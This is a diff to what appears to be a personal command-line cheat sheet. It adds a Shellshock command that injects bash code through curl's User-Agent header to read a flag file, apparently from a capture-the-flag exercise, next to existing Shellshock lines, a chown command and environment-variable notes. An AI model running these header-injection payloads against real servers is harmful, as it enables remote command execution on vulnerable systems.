@@ -276,6 +276,16 @@ wget localhost:10702/cgi-bin/board -U "() { :;  }; echo 'Content-Type: text/plai
 ```bash
 curl 3.95.14.86:10702/cgi-bin/board -H "User-Agent:() { :; }; echo 'Content-Type: text/plain'; echo ; /bin/cat /proc/flag"
 ```
+
+* Shellshock with `curl` by using `/bin/bash`
+```bash
+curl 3.95.14.86:10702/cgi-bin/board -H "User-Agent:() { :; }; echo 'Content-Type: text/plain'; echo ; /bin/bash -c "/bin/cat flag"
+```
+
+* Recursively change the owner and group of a directory
+```bash
+sudo chown -R saccharide:saccharide DIR/
+```
     
 ## Adding root certificate to OS
 * Adding certificate to `/urs/share/ca-certificate`
@@ -295,6 +305,10 @@ certutil -d sql:$HOME/.pki/nssdb -A -t "C,," -n <certificate nickname> -i <certi
 certutil -d sql:$HOME/.pki/nssdb -L -n <certificate nickname>
 ```
 ## Environment Variable
+* Add environment variable
+```bash
+export REMOTE=1
+```
 * Remove or unset an environment variable
 ```bash
 unset REMOTE
